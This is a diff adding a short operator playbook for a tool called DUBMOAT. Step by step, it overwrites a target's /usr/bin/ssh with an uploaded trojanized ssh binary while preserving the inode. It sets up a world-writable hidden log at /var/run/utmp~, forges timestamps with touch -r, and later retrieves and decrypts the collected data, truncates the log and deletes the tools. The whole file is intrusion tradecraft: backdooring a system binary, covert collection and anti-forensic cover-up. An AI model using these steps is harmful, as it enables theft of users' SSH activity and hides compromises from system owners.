@@ -1,0 +1,98 @@
+##########################################
+# DUBMOAT
+##########################################
+
+### Verify version on target:
+uname -a
+which ssh
+ssh -V
+
+### Preserve timestamps:
+-ls -i /usr/bin/ssh
+-ls -d /usr/bin
+
+touch -r /usr/bin/ssh /tmp/.st
+touch -r /usr/bin /tmp/.sb
+-lt
+
+### Create location (utmp~) for dubmoat logging:
+-ls -t /var/run
+cp /var/run/utmp /var/run/utmp~
+
+### fix permisssions so any user can write to the file:
+chmod 666 /var/run/utmp~
+
+### Download original ssh:
+-get /usr/bin/ssh
+
+### Upload dubmoat and check the version:
+-put /current/up/Ssh ssh
+./ssh -V
+
+### Cat our version over original to preserve inode:
+cat /tmp/ssh > /usr/bin/ssh
+-ls -i /usr/bin/ssh
+
+/usr/bin/ssh -V
+file /usr/bin/ssh
+
+
+### Fix timestamps:
+
+touch -r /var/run/utmp /var/run/utmp~
+touch -r /var/run/utmp /var/run
+
+touch -r /tmp/.st /usr/bin/ssh
+touch -r /tmp/.sb /usr/bin
+
+-ls -i /usr/bin/ssh
+-ls -d /usr/bin/.
+
+### Cleanup:
+
+-rm .st .sb ssh
+
+
+
+
+
+
+############################
+#  DUBMOAT COLLECTION
+############################
+
+-ls /var/adm/utmp*
+
+-get -l /var/adm/utmp~
+
+
+### Locally, extract the data from the encrypted file:
+
+cd /current/down
+/current/bin/ExtractData ./utmp > dub.TARGETNAME
+
+### Verify the contents and take note of the file size field near 
+### the beginning of the output.  Use that size to truncate the file
+### in the next step:
+
+cat dub.TARGETNAME
+
+
+### Upload the tool used to truncate the dubmoat collection file
+
+
+-put /current/bin/TruncateFileRemote dmt
+chmod 700 dmt
+
+
+### Using the first "FILE SIZE" field from the output above,
+### truncate the most recent collection out of the file
+-lt /var/adm/utmp~
+./dmt /var/adm/utmp~ <FILESIZE>
+-lt /var/adm/utmp~
+
+-rm dmt
+
+
+
+
